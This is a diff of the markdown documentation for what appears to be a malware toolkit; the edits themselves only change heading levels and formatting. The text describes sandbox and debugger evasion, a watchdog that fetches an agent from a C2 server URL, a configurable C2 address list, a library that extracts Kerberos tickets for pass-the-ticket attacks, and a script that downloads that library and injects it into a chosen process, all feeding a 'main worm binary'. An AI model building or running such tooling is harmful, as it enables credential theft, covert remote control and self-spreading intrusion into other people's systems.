@@ -194,9 +194,9 @@ This component provides:
 
 ---
 
-### Features
+## Features
 
-* **Anti-analysis**
+* Anti analysis
   is_compromised returns true if a debugger is present, a hypervisor bit is set, or DMI strings indicate a sandbox environment.
 
 * **Watchdog**
@@ -214,7 +214,7 @@ This component provides:
 
 ---
 
-### Build & Usage
+## Build & Usage
 
 #### Prerequisites
 
@@ -232,7 +232,7 @@ This produces:
 * c2_config.dll
 * watchdog.exe
 
-#### Running
+## Running
 
 ```
 watchdog.exe <agent.exe> <https://c2.server/agent.exe>
@@ -246,7 +246,7 @@ watchdog.exe <agent.exe> <https://c2.server/agent.exe>
 
 ---
 
-### Updating the C2 List
+## Updating the C2 List
 
 1. Edit dll/c2_config.c, adjust C2Count and the C2Addresses array.
 2. Rebuild just the DLL:
@@ -329,12 +329,12 @@ id,cve,description,path
  
 Platform independent shared C library so/dll that extracts and serializes Kerberos tickets from the local cache krb5cc_<uid> for use in SMB/SSH authentication pass‑the‑ticket. Supports reading the default or a custom ccache path. Serializes each ticket into a compact binary format: [4‑byte BE length][ticket data]. Lightweight, with no external dependencies except MIT Kerberos. Suitable for dynamic loading via dlopen / LoadLibrary and invocation from Go/Python/C embeddings  
 
-### Functions
+## Functions
 - ptt_init initialize the Kerberos context.  
 - ptt_export open the specified or default ccache, iterate all tickets, and serialize them into the buffer. 
 - ptt_cleanup free Kerberos context resources.  
 
-### Build
+## Build
 ```
 mkdir build && cd build
 cmake ..
@@ -346,20 +346,20 @@ Generates:
 * libptt.so on Linux
 * ptt.dll on Windows
 
-### Injection using start.py
+## Injection using start.py
 
 ```
 python3 start.py <URL_LIB> <PID>
 ```
 
-* <URL_LIB> — URL to `libptt.so` or `ptt.dll`
+* <URL_LIB> — URL to libptt.so or ptt.dll
 * <PID>     — target process ID for injection
 
 The script downloads the library into TEMP, detects the platform, and injects it into the target process on Linux/Windows.
 
 ---
 
-### Integration
+## Integration
 
 The main worm binary can invoke start.py to:
 
